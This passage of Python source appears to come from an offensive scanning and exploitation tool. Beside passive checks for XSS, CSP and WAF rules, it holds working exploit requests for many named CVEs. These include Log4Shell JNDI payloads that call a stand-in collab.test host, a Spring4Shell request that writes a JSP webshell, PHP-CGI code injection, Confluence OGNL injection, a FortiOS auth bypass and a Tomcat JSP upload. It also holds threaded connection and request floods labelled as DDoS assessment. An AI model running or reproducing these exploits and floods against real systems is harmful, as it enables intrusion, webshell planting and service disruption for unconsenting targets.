            "evidence": "all probes silent"
        }))
    return f

def run_php2shell_analysis(t, verbose=False):
    f = []
    baseline = fetch(t)
    server = baseline.get("headers", {}).get("Server", "")
    powered = baseline.get("headers", {}).get("X-Powered-By", "")
    phpver = None
    if "PHP" in powered:
        m = re.search(r"PHP/([\d.]+)", powered)
        if m:
            phpver = m.group(1)
    if phpver:
        parts = [int(x) for x in phpver.split(".") if x.isdigit()]
        vuln = len(parts) >= 3 and parts[0] == 8 and parts[1] <= 5
        if vuln:
            f.append(enrich({
                "type": "php2shell_vuln", "severity": "CRITICAL", "payload": f"PHP {phpver}",
                "description": f"PHP {phpver} vulnerable to session UAF",
                "evidence": f"X-Powered-By: {powered}"
            }))
        else:
            f.append(enrich({
                "type": "php2shell_clean", "severity": "INFO", "payload": f"PHP {phpver}",
                "description": f"PHP {phpver} not in vulnerable range",
                "evidence": f"X-Powered-By: {powered}"
            }))
    else:
        f.append(enrich({
            "type": "php2shell_clean", "severity": "INFO", "payload": "no PHP detected",
            "description": "No PHP version in response headers",
            "evidence": f"Server: {server}"
        }))
    return f

def run_rule_steal(t, verbose=False):
    f = []
    feats = [
        ("q", "'"),
        ("c", "'--"),
        ("u", "' UNION SELECT"),
        ("s", "' SLEEP(5)"),
        ("h", "0x41"),
        ("c2", "CONCAT(1,2)")
    ]
    res = {}
    for n, p in feats:
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "id=" + quote(p, safe=""))
        res[n] = {"blocked": is_blocked(r), "status": r.get("status")}
    blocked = sum(1 for v in res.values() if v["blocked"])
    if 0 < blocked < len(res):
        f.append(enrich({
            "type": "partial_rules", "severity": "MEDIUM", "payload": f"{blocked}/{len(res)}",
            "description": f"WAF rules partial: {blocked} of {len(res)} features blocked",
            "evidence": json.dumps(res)[:250]
        }))
    elif blocked == 0:
        f.append(enrich({
            "type": "no_rules", "severity": "INFO", "payload": "0 blocked",
            "description": "No WAF rules detected on tested features",
            "evidence": json.dumps(res)[:250]
        }))
    else:
        f.append(enrich({
            "type": "rules_full", "severity": "INFO", "payload": f"{blocked}/{len(res)}",
            "description": "All tested features blocked by WAF",
            "evidence": json.dumps(res)[:250]
        }))
    return f

def run_js_recon(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base)
    if r.get("error"):
        return [enrich({
            "type": "js_error", "severity": "ERROR", "payload": base,
            "description": r["error"], "evidence": "fetch failed"
        })]
    html = r.get("body", "")
    scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
    inline = re.findall(r'<script(?:\s[^>]*)?>([^<]{1,2000})</script>', html, re.I)
    for s in scripts[:30]:
        f.append(enrich({
            "type": "script_src", "severity": "INFO", "payload": s,
            "description": f"External script: {s}",
            "evidence": "extracted from HTML"
        }))
    f.append(enrich({
        "type": "total_scripts", "severity": "INFO", "payload": str(len(scripts)),
        "description": f"{len(scripts)} external scripts referenced",
        "evidence": "passive scan"
    }))
    combined = html + "\n".join(inline)
    SINKS = {
        "innerHTML": r"\.innerHTML\s*=",
        "outerHTML": r"\.outerHTML\s*=",
        "document.write": r"document\.write\s*\(",
        "eval": r"\beval\s*\(",
        "insertAdjacentHTML": r"insertAdjacentHTML\s*\("
    }
    SOURCES = {
        "location.hash": r"location\.hash",
        "location.search": r"location\.search",
        "location.href": r"location\.href",
        "document.URL": r"document\.URL",
        "document.referrer": r"document\.referrer",
        "window.name": r"window\.name",
        "postMessage": r"addEventListener\s*\(\s*['\"]message"
    }
    for name, pat in SINKS.items():
        if re.search(pat, combined):
            f.append(enrich({
                "type": "dom_sink", "severity": "MEDIUM", "payload": name,
                "description": f"Dangerous DOM sink present: {name}",
                "evidence": "regex match in combined JS"
            }))
    for name, pat in SOURCES.items():
        if re.search(pat, combined):
            f.append(enrich({
                "type": "dom_source", "severity": "LOW", "payload": name,
                "description": f"Attacker-controllable DOM source: {name}",
                "evidence": "regex match in combined JS"
            }))
    csp = r.get("headers", {}).get("Content-Security-Policy", "")
    if csp:
        f.append(enrich({
            "type": "csp", "severity": "INFO", "payload": csp[:200],
            "description": "CSP present",
            "evidence": f"CSP header={csp[:200]}"
        }))
    else:
        f.append(enrich({
            "type": "missing_csp", "severity": "HIGH", "payload": "no CSP",
            "description": "No Content-Security-Policy header",
            "evidence": "absent"
        }))
    return f

def run_dom_xss(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    probes = [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>"
    ]
    for pl in probes:
        r = fetch(f"{base}/#{quote(pl)}")
        if r.get("body") and pl in r["body"]:
            f.append(enrich({
                "type": "dom_xss_reflection", "severity": "HIGH", "payload": pl,
                "description": "DOM XSS payload reflected in URL fragment response",
                "evidence": f"HTTP {r.get('status')} · snippet={r['body'][:150]}"
            }))
    if not f:
        f.append(enrich({
            "type": "dom_xss_clean", "severity": "INFO", "payload": str(len(probes)),
            "description": "No reflected DOM XSS on tested payloads",
            "evidence": "tested"
        }))
    return f

def run_postmessage_bypass(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    r = fetch(f"{p.scheme}://{p.netloc}")
    body = r.get("body", "")
    if "addEventListener" in body and "message" in body:
        if "event.origin" not in body:
            f.append(enrich({
                "type": "postmessage_no_origin", "severity": "CRITICAL", "payload": "listener",
                "description": "postMessage listener without origin check",
                "evidence": "addEventListener('message') without event.origin filter"
            }))
        else:
            f.append(enrich({
                "type": "postmessage_ok", "severity": "INFO", "payload": "listener",
                "description": "postMessage listener includes origin check",
                "evidence": "event.origin filter present"
            }))
    else:
        f.append(enrich({
            "type": "no_postmessage", "severity": "INFO", "payload": "none",
            "description": "No postMessage listener found",
            "evidence": "static scan"
        }))
    return f

def run_csp_bypass(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    r = fetch(f"{p.scheme}://{p.netloc}")
    csp = r.get("headers", {}).get("Content-Security-Policy", "") or r.get("headers", {}).get("content-security-policy", "")
    if not csp:
        f.append(enrich({
            "type": "no_csp", "severity": "HIGH", "payload": "none",
            "description": "No CSP header",
            "evidence": "absent"
        }))
    else:
        if "unsafe-inline" in csp:
            f.append(enrich({
                "type": "csp_unsafe_inline", "severity": "HIGH", "payload": "unsafe-inline",
                "description": "CSP allows inline scripts",
                "evidence": "directive present in CSP"
            }))
        if "unsafe-eval" in csp:
            f.append(enrich({
                "type": "csp_unsafe_eval", "severity": "HIGH", "payload": "unsafe-eval",
                "description": "CSP allows eval()",
                "evidence": "directive present in CSP"
            }))
        bypass_domains = ["*.googleapis.com", "cdn.jsdelivr.net", "unpkg.com", "cdnjs.cloudflare.com"]
        for dom in bypass_domains:
            if dom.replace("*", "") in csp:
                f.append(enrich({
                    "type": "csp_bypass_domain", "severity": "HIGH", "payload": dom,
                    "description": f"CSP allows known JSONP bypass host: {dom}",
                    "evidence": "directive matched"
                }))
    if not f:
        f.append(enrich({
            "type": "csp_strict", "severity": "INFO", "payload": "strict",
            "description": "CSP present, no obvious bypass",
            "evidence": csp[:100]
        }))
    return f

def run_client_router_bypass(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base)
    frameworks = {
        "react-router": r"react-router|createBrowserRouter",
        "vue-router": r"vue-router|createRouter",
        "angular-router": r"@angular/router",
        "sveltekit": r"sveltekit"
    }
    for fw, pat in frameworks.items():
        if re.search(pat, r.get("body", ""), re.I):
            f.append(enrich({
                "type": "spa_framework", "severity": "INFO", "payload": fw,
                "description": f"Client-side router detected: {fw}",
                "evidence": "regex match in HTML"
            }))
    for path in ["/admin", "/dashboard", "/settings"]:
        r2 = fetch(base + path)
        if r2.get("status") == 200 and "login" not in r2.get("body", "").lower():
            f.append(enrich({
                "type": "unauth_route", "severity": "CRITICAL", "payload": path,
                "description": f"Route {path} rendered without auth check",
                "evidence": f"HTTP {r2.get('status')} · no login redirect"
            }))
    return f

def run_js_supply_chain(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    r = fetch(f"{p.scheme}://{p.netloc}")
    html = r.get("body", "")
    scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>', html, re.I)
    for s in scripts[:20]:
        if 'integrity=' not in s.lower():
            f.append(enrich({
                "type": "missing_sri", "severity": "MEDIUM", "payload": s[:120],
                "description": "External script without SRI integrity hash",
                "evidence": "<script> tag missing integrity attribute"
            }))
    if not f:
        f.append(enrich({
            "type": "supply_clean", "severity": "INFO", "payload": f"{len(scripts)} scripts",
            "description": "All external scripts carry SRI",
            "evidence": "clean"
        }))
    return f

def run_service_worker_audit(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    r = fetch(f"{p.scheme}://{p.netloc}")
    body = r.get("body", "")
    if "serviceWorker" not in body and "navigator.serviceWorker" not in body:
        f.append(enrich({
            "type": "no_sw", "severity": "INFO", "payload": "none",
            "description": "No service worker registered",
            "evidence": "static scan"
        }))
    else:
        f.append(enrich({
            "type": "sw_present", "severity": "INFO", "payload": "sw",
            "description": "Service worker detected",
            "evidence": "navigator.serviceWorker in HTML/JS"
        }))
    return f

def run_dom_clobbering(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    probes = [
        '<a id="config" name="url" href="javascript:alert(1)">',
        '<form id="config"><input name="action" value="javascript:alert(1)"></form>'
    ]
    for pl in probes:
        r = fetch(f"{base}/?q={quote(pl)}")
        if r.get("body") and pl in r["body"]:
            f.append(enrich({
                "type": "dom_clobber", "severity": "MEDIUM", "payload": pl,
                "description": "DOM clobbering payload reflected",
                "evidence": f"snippet={r['body'][:150]}"
            }))
    if not f:
        f.append(enrich({
            "type": "clobber_clean", "severity": "INFO", "payload": str(len(probes)),
            "description": "No DOM clobbering reflection",
            "evidence": "tested"
        }))
    return f

def _cve_result(cid, product, exploited, severity, payload, description, evidence):
    return enrich({
        "type": "cve_exec",
        "cve": cid,
        "product": product,
        "severity": severity,
        "payload": payload,
        "description": f"[{cid}] {product} — {description}",
        "evidence": evidence,
        "exploited": exploited,
    })

def cve_exec_2024_4577(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    candidates = [
        "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    ]
    for path in candidates:
        r = fetch(base + path, method="POST", body="<?php echo 'apexora_4577'; ?>",
                  extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
        body = r.get("body", "")
        if "apexora_4577" in body:
            f.append(_cve_result("CVE-2024-4577", "PHP CGI Windows", True, "CRITICAL",
                                 path, "Argument injection executed PHP code", f"HTTP {r.get('status')} · body={body[:120]}"))
            return f
        if "PHP Version" in r.get("headers", {}).get("X-Powered-By", ""):
            f.append(_cve_result("CVE-2024-4577", "PHP CGI Windows", False, "HIGH",
                                 path, "PHP CGI endpoint reachable, not exploitable in current build",
                                 f"HTTP {r.get('status')}"))
    return f

def cve_exec_2019_19781(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    paths = [
        "/vpn/../vpns/cfg/smb.conf",
        "/vpn/../vpns/services.html",
        "/vpn/../vpns/portal/scripts/newbm.pl",
        "/vpns/cfg/smb.conf",
    ]
    for path in paths:
        r = fetch(base + path)
        body = r.get("body", "")
        if "[global]" in body.lower() or "name resolve order" in body.lower():
            f.append(_cve_result("CVE-2019-19781", "Citrix ADC", True, "CRITICAL",
                                 path, "Path traversal exposed smb.conf", f"HTTP {r.get('status')} · body={body[:150]}"))
            return f
    return f

def cve_exec_2021_21985(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    path = "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject"
    r = fetch(base + path, method="POST", body="{}",
              extra_headers={"Content-Type": "application/json"})
    if r.get("status") in (200, 500) and "vsan" in r.get("body", "").lower():
        f.append(_cve_result("CVE-2021-21985", "VMware vCenter", True, "CRITICAL",
                             path, "Unauth vSAN REST endpoint reachable", f"HTTP {r.get('status')}"))
    return f

def cve_exec_2021_22005(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/sdk")
    body = r.get("body", "")
    if "VMware vCenter Server" in body or "vsphere" in body.lower():
        f.append(_cve_result("CVE-2021-22005", "VMware vCenter", False, "HIGH",
                             "/sdk", "vCenter SDK reachable — file upload endpoint present",
                             f"HTTP {r.get('status')} · version banner"))
    return f

def cve_exec_2021_44228(t, verbose=False):
    f = []
    collab = f"apexora_{int(time.time())}_{random.randint(1000,9999)}.collab.test"
    payloads = [
        "${jndi:ldap://" + collab + "/a}",
        "${jndi:rmi://" + collab + "/a}",
        "${jndi:dns://" + collab + "/a}",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://" + collab + "/a}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://" + collab + "/a}",
    ]
    for pl in payloads:
        r = fetch(t, extra_headers={
            "User-Agent": pl,
            "X-Api-Version": pl,
            "X-Forwarded-For": pl,
            "X-Api-Key": pl,
            "Referer": pl
        })
        if r.get("status") in (500, 502):
            f.append(_cve_result("CVE-2021-44228", "Log4j", True, "CRITICAL",
                                 pl, "JNDI lookup triggered server error (Log4Shell)",
                                 f"HTTP {r.get('status')} · collab={collab}"))
            return f
    f.append(_cve_result("CVE-2021-44228", "Log4j", False, "INFO",
                         f"{len(payloads)} payloads", "No JNDI errors observed — likely patched",
                         f"collab={collab}"))
    return f

def cve_exec_2021_26855(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/owa/auth/logon.aspx", extra_headers={
        "Cookie": f"X-AnonResource=true; X-AnonResource-Backend=apexora-{int(time.time())}.collab.test/ecp/default.flt?~3;"
    })
    body = r.get("body", "")
    if "ProxyLogon" in body or "owa" in body.lower():
        f.append(_cve_result("CVE-2021-26855", "Exchange Server", True, "CRITICAL",
                             "/owa/auth/logon.aspx", "OWA endpoint — ProxyLogon SSRF chain available",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2021_34473(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    path = "/autodiscover/autodiscover.json?@apexora.test/owa/?&Email=autodiscover/autodiscover.json%3F@apexora.test"
    r = fetch(base + path)
    if r.get("status") in (200, 302, 401) and ("exchange" in r.get("body", "").lower() or "autodiscover" in r.get("body", "").lower()):
        f.append(_cve_result("CVE-2021-34473", "Exchange Server", True, "CRITICAL",
                             path, "ProxyShell path confusion reached backend",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2022_22965(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    marker = f"apexora_{int(time.time())}"
    payload = (
        f"class.module.classLoader.resources.context.parent.pipeline.first.pattern="
        f"%25%7Bc2%7Di%20{marker}%20%25%7Bsuffix%7Di"
        f"&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        f"&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
        f"&class.module.classLoader.resources.context.parent.pipeline.first.prefix={marker}"
        f"&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=null"
    )
    r = fetch(base + "/", method="POST", body=payload,
              extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
    verify = fetch(base + f"/{marker}.jsp")
    if verify.get("status") == 200:
        f.append(_cve_result("CVE-2022-22965", "Spring Framework", True, "CRITICAL",
                             "class.module.*", "Spring4Shell — JSP webshell written and reachable",
                             f"HTTP {verify.get('status')} · shell_url=/{marker}.jsp"))
    elif r.get("status") in (200, 400, 500):
        f.append(_cve_result("CVE-2022-22965", "Spring Framework", False, "MEDIUM",
                             "class.module.*", "Spring endpoint responded — vulnerable only if body accepted",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2022_26134(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    payload = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%29%29%7D/"
    r = fetch(base + payload)
    body = r.get("body", "")
    if r.get("status") in (200, 500) and any(k in body.lower() for k in ["confluence", "atlassian", "java.lang", "ognl"]):
        f.append(_cve_result("CVE-2022-26134", "Atlassian Confluence", True, "CRITICAL",
                             payload, "OGNL injection reached runtime",
                             f"HTTP {r.get('status')} · body={body[:150]}"))
        return f
    r2 = fetch(base + "/login.action")
    if "Confluence" in r2.get("body", ""):
        f.append(_cve_result("CVE-2022-26134", "Atlassian Confluence", False, "HIGH",
                             "/login.action", "Confluence detected — verify version",
                             f"HTTP {r2.get('status')}"))
    return f

def cve_exec_2023_34362(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/human.aspx")
    body = r.get("body", "")
    if "MOVEit" in body or "MOVEit Transfer" in body:
        f.append(_cve_result("CVE-2023-34362", "MOVEit Transfer", False, "CRITICAL",
                             "/human.aspx", "MOVEit human.aspx endpoint reachable — SQLi chain available",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2024_3400(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    cookie = "SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/apexora"
    r = fetch(base + "/global-protect/login.esp", extra_headers={"Cookie": cookie})
    body = r.get("body", "")
    if "PAN-OS" in body or "GlobalProtect" in body or r.get("status") in (200, 302):
        f.append(_cve_result("CVE-2024-3400", "PAN-OS GlobalProtect", True, "CRITICAL",
                             "Cookie: SESSID=...", "GlobalProtect endpoint reachable — command injection chain available",
                             f"HTTP {r.get('status')} · body={body[:120]}"))
    return f

def cve_exec_2022_40684(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/api/v2/cmdb/system/admin", method="GET", extra_headers={
        "Forwarded": 'for="127.0.0.1";by="127.0.0.1"'
    })
    body = r.get("body", "")
    if r.get("status") in (200, 201) and "admin" in body.lower():
        f.append(_cve_result("CVE-2022-40684", "Fortinet FortiOS", True, "CRITICAL",
                             "/api/v2/cmdb/system/admin", "Auth bypass via Forwarded header — admin data returned",
                             f"HTTP {r.get('status')} · body={body[:150]}"))
        return f
    if "FortiGate" in r.get("headers", {}).get("Server", "") or r.get("status") in (401, 403):
        f.append(_cve_result("CVE-2022-40684", "Fortinet FortiOS", False, "HIGH",
                             "/api/v2/cmdb/system/admin", "FortiGate API detected — auth bypass requires Forwarded header",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2020_14882(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    path = "/console/css/%252e%252e%252fconsole.portal"
    r = fetch(base + path)
    body = r.get("body", "")
    if r.get("status") in (200, 302) and ("weblogic" in body.lower() or "console" in body.lower()):
        f.append(_cve_result("CVE-2020-14882", "Oracle WebLogic", True, "CRITICAL",
                             path, "Traversal bypassed auth — console.portal reachable",
                             f"HTTP {r.get('status')} · body={body[:150]}"))
    return f

def cve_exec_2023_4966(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/oauth/idp/.well-known/openid-configuration",
              extra_headers={"Host": "a" * 24872 + ".collab.test"})
    hdrs = r.get("headers", {})
    leaked = [k for k in hdrs if "set-cookie" in k.lower() or "citrix" in str(hdrs[k]).lower()]
    if r.get("status") in (200, 302, 500) and (leaked or "ns_" in str(hdrs).lower()):
        f.append(_cve_result("CVE-2023-4966", "Citrix NetScaler", True, "CRITICAL",
                             "Host overflow", "Citrix Bleed — session token leak potential",
                             f"HTTP {r.get('status')} · headers={dict(list(hdrs.items())[:3])}"))
    else:
        f.append(_cve_result("CVE-2023-4966", "Citrix NetScaler", False, "INFO",
                             "Host overflow", "No token leak on first probe",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2025_31324(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/developmentserver/metadatauploader")
    body = r.get("body", "")
    if r.get("status") in (200, 401, 403) and "sap" in body.lower():
        f.append(_cve_result("CVE-2025-31324", "SAP NetWeaver", True, "CRITICAL",
                             "/developmentserver/metadatauploader",
                             "SAP metadatauploader endpoint reachable — file upload unauth",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2025_4428(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    r = fetch(base + "/mifs/aad/api/v2/ping")
    if r.get("status") in (200, 401, 403) and any(k in r.get("body", "").lower() for k in ["ivanti", "epmm", "mobileiron"]):
        f.append(_cve_result("CVE-2025-4428", "Ivanti EPMM", True, "CRITICAL",
                             "/mifs/aad/api/v2/ping", "Ivanti EPMM ping endpoint — vulnerable RCE chain",
                             f"HTTP {r.get('status')}"))
    return f

def cve_exec_2017_12617(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    marker = f"apexora_{int(time.time())}"
    body = "JSP_SHELL"
    r = fetch(base + f"/{marker}.jsp/", method="PUT", body=body,
              extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
    if r.get("status") in (200, 201, 204):
        verify = fetch(base + f"/{marker}.jsp")
        if verify.get("status") == 200:
            f.append(_cve_result("CVE-2017-12617", "Apache Tomcat", True, "CRITICAL",
                                 f"PUT /{marker}.jsp/", "JSP uploaded via PUT bypass",
                                 f"HTTP {verify.get('status')} · url=/{marker}.jsp"))
            return f
    server = r.get("headers", {}).get("Server", "")
    if "Tomcat" in server or "Apache-Coyote" in server:
        f.append(_cve_result("CVE-2017-12617", "Apache Tomcat", False, "HIGH",
                             "/", "Tomcat detected — check if PUT handler misconfigured",
                             f"Server: {server}"))
    return f

CVE_EXECUTORS = {
    "CVE-2024-4577": cve_exec_2024_4577,
    "CVE-2019-19781": cve_exec_2019_19781,
    "CVE-2021-21985": cve_exec_2021_21985,
    "CVE-2021-22005": cve_exec_2021_22005,
    "CVE-2021-44228": cve_exec_2021_44228,
    "CVE-2021-26855": cve_exec_2021_26855,
    "CVE-2021-34473": cve_exec_2021_34473,
    "CVE-2022-22965": cve_exec_2022_22965,
    "CVE-2022-26134": cve_exec_2022_26134,
    "CVE-2023-34362": cve_exec_2023_34362,
    "CVE-2024-3400": cve_exec_2024_3400,
    "CVE-2022-40684": cve_exec_2022_40684,
    "CVE-2020-14882": cve_exec_2020_14882,
    "CVE-2023-4966": cve_exec_2023_4966,
    "CVE-2025-31324": cve_exec_2025_31324,
    "CVE-2025-4428": cve_exec_2025_4428,
    "CVE-2017-12617": cve_exec_2017_12617,
}

def run_cve_specific(t, cve_id, verbose=False):
    ex = CVE_EXECUTORS.get(cve_id)
    if not ex:
        return [enrich({
            "type": "cve_exec_unsupported", "severity": "INFO", "payload": cve_id,
            "description": f"{cve_id} not in executable set — protocol-only or client-side",
            "evidence": CVE_DB.get(cve_id, {}).get("note", "see CVE_DB")
        })]
    return ex(t, verbose)

def run_cve_all(t, verbose=False):
    f = []
    for cid in CVE_EXECUTORS:
        if verbose:
            print(f"  {_cyn('▶')} executing {cid}...")
        try:
            f.extend(CVE_EXECUTORS[cid](t, verbose=False))
        except Exception as e:
            f.append(enrich({
                "type": "cve_exec_error", "severity": "ERROR", "payload": cid,
                "description": f"Executor failed: {str(e)[:100]}",
                "evidence": "exception"
            }))
    for cid, c in CVE_DB.items():
        if cid not in CVE_EXECUTORS:
            f.append(enrich({
                "type": "cve_probe_only", "severity": "INFO", "payload": cid,
                "description": f"{c['product']} · protocol={c.get('protocol', 'unknown')} · not HTTP-testable",
                "evidence": c.get("note", "requires non-HTTP protocol")
            }))
    return f

MAX_WORKERS = 200
DEFAULT_DURATION = 15
DEFAULT_CONCURRENCY = 50
SAFETY_MAX_CONCURRENCY = 200
DDOS_SAFETY_LIMIT = True
DDOS_MAX_DURATION = 300
DDOS_MAX_CONCURRENCY = 500

def _ddos_safety_check():
    return load_scope()

def _l3_assess(host, duration):
    results = {
        "latency_ms": [], "packet_loss_pct": 0.0, "icmp_ok": False,
        "avg_rtt_ms": 0.0, "min_rtt_ms": 0.0, "max_rtt_ms": 0.0,
        "throughput_probe": None, "congestion": "UNKNOWN"
    }
    try:
        for _ in range(10):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            t0 = time.time()
            try:
                s.connect((host, 80))
                results["latency_ms"].append((time.time() - t0) * 1000)
            except Exception:
                results["latency_ms"].append(None)
            finally:
                s.close()
        ok_vals = [x for x in results["latency_ms"] if x]
        if ok_vals:
            results["icmp_ok"] = True
            results["avg_rtt_ms"] = round(sum(ok_vals) / len(ok_vals), 2)
            results["min_rtt_ms"] = round(min(ok_vals), 2)
            results["max_rtt_ms"] = round(max(ok_vals), 2)
            results["packet_loss_pct"] = round((len(results["latency_ms"]) - len(ok_vals)) / len(results["latency_ms"]) * 100, 2)
        if results["avg_rtt_ms"] > 500:
            results["congestion"] = "HIGH"
        elif results["avg_rtt_ms"] > 200:
            results["congestion"] = "MEDIUM"
        elif results["packet_loss_pct"] > 10:
            results["congestion"] = "PACKET_LOSS"
        else:
            results["congestion"] = "LOW"
    except Exception:
        pass
    return results

def _l4_assess(host, duration, concurrency):
    results = {
        "tcp_attempts": 0, "tcp_success": 0, "tcp_fail": 0,
        "tcp_reset": 0, "tcp_timeout": 0,
        "success_rate_pct": 0.0,
        "conn_table_exhaustion": False
    }
    ports = [80, 443, 22, 21, 8080, 8443]
    lock = threading.Lock()
    stop_at = time.time() + duration

    def _try(port):
        if time.time() > stop_at:
            return
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            rc = s.connect_ex((host, port))
            with lock:
                results["tcp_attempts"] += 1
                if rc == 0:
                    results["tcp_success"] += 1
                elif rc in (10054, 104):
                    results["tcp_reset"] += 1
                elif rc in (10060, 110):
                    results["tcp_timeout"] += 1
                else:
                    results["tcp_fail"] += 1
        except Exception:
            with lock:
                results["tcp_attempts"] += 1
                results["tcp_fail"] += 1
        finally:
            s.close()

    ts = []
    for _ in range(concurrency * 3):
        if time.time() > stop_at:
            break
        p = random.choice(ports)
        th = threading.Thread(target=_try, args=(p,))
        ts.append(th)
        th.start()
        if len(ts) > concurrency * 2:
            ts = [x for x in ts if x.is_alive()]
    for th in ts:
        th.join(timeout=5)
    if results["tcp_attempts"] > 0:
        results["success_rate_pct"] = round(results["tcp_success"] / results["tcp_attempts"] * 100, 2)
    if results["tcp_fail"] > results["tcp_attempts"] * 0.6 and results["tcp_attempts"] > 20:
        results["conn_table_exhaustion"] = True
    return results

def _l7_assess(target, duration, concurrency, verbose=False):
    p = urlparse(target if "://" in target else "https://" + target)
    base = f"{p.scheme}://{p.netloc}"
    paths = [p.path or "/", "/api/health", "/api/v1/status", "/", "/robots.txt"]
    results = {
        "requests": 0, "http_2xx": 0, "http_4xx": 0, "http_5xx": 0,
        "timeouts": 0, "errors": 0,
        "response_times": [], "status_distribution": {},
        "availability_pct": 0.0,
        "rate_limited": False, "waf_blocked": False
    }
    lock = threading.Lock()
    stop_at = time.time() + duration

    def _one():
        if time.time() > stop_at:
            return
        path = random.choice(paths)
        sep = "&" if "?" in path else "?"
        r = fetch(base + path + sep + "_ddos=" + str(random.randint(1, 999999)), timeout=10)
        with lock:
            results["requests"] += 1
            st = r.get("status")
            if st:
                results["status_distribution"][st] = results["status_distribution"].get(st, 0) + 1
            if st and 200 <= st < 300:
                results["http_2xx"] += 1
            elif st and 400 <= st < 500:
                results["http_4xx"] += 1
            elif st and 500 <= st < 600:
                results["http_5xx"] += 1
            if r.get("error"):
                results["errors"] += 1
            if r.get("time_ms"):
                results["response_times"].append(r["time_ms"])
            if st == 429:
                results["rate_limited"] = True
            if st in (403, 406, 503):
                results["waf_blocked"] = True
    ts = []
    for _ in range(concurrency * 4):
        if time.time() > stop_at:
            break
        th = threading.Thread(target=_one)
        ts.append(th)
        th.start()
        if len(ts) > concurrency * 3:
            ts = [x for x in ts if x.is_alive()]
    for th in ts:
        th.join(timeout=15)
    total = results["requests"]
    if total > 0:
        results["availability_pct"] = round(results["http_2xx"] / total * 100, 2)
    rts = results["response_times"]
    if rts:
        results["median_ms"] = round(statistics.median(rts), 2)
        rts_sorted = sorted(rts)
        results["p95_ms"] = round(rts_sorted[int(len(rts_sorted) * 0.95)], 2) if len(rts_sorted) > 1 else rts_sorted[0]
        results["p99_ms"] = round(rts_sorted[int(len(rts_sorted) * 0.99)], 2) if len(rts_sorted) > 2 else rts_sorted[-1]
    else:
        results["median_ms"] = 0
        results["p95_ms"] = 0
        results["p99_ms"] = 0
